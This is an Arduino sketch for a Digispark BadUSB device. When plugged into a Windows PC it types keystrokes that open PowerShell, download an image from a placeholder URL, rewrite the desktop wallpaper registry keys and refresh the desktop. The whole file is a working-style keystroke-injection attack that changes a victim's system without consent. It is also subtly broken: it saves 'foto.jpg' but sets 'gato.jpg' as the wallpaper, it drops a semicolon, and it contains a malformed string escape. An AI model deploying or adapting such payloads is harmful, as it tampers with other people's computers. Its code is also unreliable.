#include "DigiKeyboardPtBr.h"
void setup() {
  //empty
}
void loop() {
DigiKeyboardPtBr.sendKeyStroke(0);
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.println("powershell");
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.println("$client = new-object System.Net.WebClient");
DigiKeyboardPtBr.delay(500);        
DigiKeyboardPtBr.println("$client.DownloadFile(\"URL_DA_FOTO\" , \"foto.jpg\")");
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.println("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /t REG_SZ /d "" /f")
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\gato.jpg\" /f");
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaperStyle /t REG_SZ /d 2 /f");
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.println("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True");
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.println("exit");

  for(;;){ /*empty*/ }
}
